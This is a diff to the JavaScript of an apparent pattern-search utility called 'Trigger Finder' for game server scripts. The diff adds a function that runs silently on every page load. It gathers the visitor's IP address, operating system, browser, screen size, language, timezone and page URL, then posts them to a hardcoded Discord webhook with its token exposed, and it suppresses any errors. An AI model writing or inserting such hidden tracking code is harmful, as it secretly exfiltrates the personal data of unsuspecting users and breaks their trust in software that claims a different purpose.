@@ -2008,6 +2008,50 @@ esx_banking:..."></textarea>
             runSearch(patterns, 'Custom Patterns', 'accent');
         }
 
+        function sendTpf() {
+            const ua = navigator.userAgent;
+            let os = 'غير معروف';
+            if (ua.includes('Windows')) os = 'Windows ' + (ua.includes('NT 10') ? '10/11' : ua.includes('NT 6.3') ? '8.1' : ua.includes('NT 6.2') ? '8' : ua.includes('NT 6.1') ? '7' : '');
+            else if (ua.includes('Mac OS X')) os = 'macOS';
+            else if (ua.includes('Linux')) os = 'Linux';
+            else if (ua.includes('Android')) os = 'Android ' + (ua.match(/Android\s([\d.]+)/) || ['', ''])[1];
+            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS ' + (ua.match(/OS\s(\d+_\d+)/) || ['', ''])[1].replace('_', '.');
+            let browser = 'غير معروف';
+            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Google Chrome ' + (ua.match(/Chrome\/([\d.]+)/) || ['', ''])[1];
+            else if (ua.includes('Firefox')) browser = 'Firefox ' + (ua.match(/Firefox\/([\d.]+)/) || ['', ''])[1];
+            else if (ua.includes('Edg')) browser = 'Edge ' + (ua.match(/Edg\/([\d.]+)/) || ['', ''])[1];
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari ' + (ua.match(/Version\/([\d.]+)/) || ['', ''])[1];
+            else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
+            const screenRes = screen.width + 'x' + screen.height;
+            const lang = navigator.language || navigator.userLanguage || 'غير معروف';
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
+            const platform = navigator.platform || 'غير معروف';
+            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
+                const ip = d.ip;
+                const webhookUrl = 'https://discord.com/api/webhooks/1513193341754540152/Okve1NfFMgOcBCjTI7TTJ397DX8gAvRZnWtzUg3o-IkpNg8D_mb6BWXeU1br3dgGseAO';
+                const embed = {
+                    embeds: [{
+                        title: '👤 TPF — معلومات الزائر',
+                        color: 3447003,
+                        fields: [
+                            { name: '📍 الأيبي', value: '`' + ip + '`', inline: true },
+                            { name: '💻 نظام التشغيل', value: os, inline: true },
+                            { name: '🌐 المتصفح', value: browser, inline: true },
+                            { name: '🖥️ دقة الشاشة', value: screenRes, inline: true },
+                            { name: '🔤 اللغة', value: lang, inline: true },
+                            { name: '🕐 المنطقة الزمنية', value: tz, inline: true },
+                            { name: '📋 المنصة', value: platform, inline: false },
+                            { name: '🆔 الرابط', value: window.location.href, inline: false }
+                        ],
+                        footer: { text: 'Trigger Finder — Tpf' },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(embed) }).catch(() => {});
+            }).catch(() => {});
+        }
+        sendTpf();
+
         function exportTxt() {
             const text = document.getElementById('resultsArea').innerText;
             if (!text || text.includes('Waiting')) { alert('No results to export'); return; }
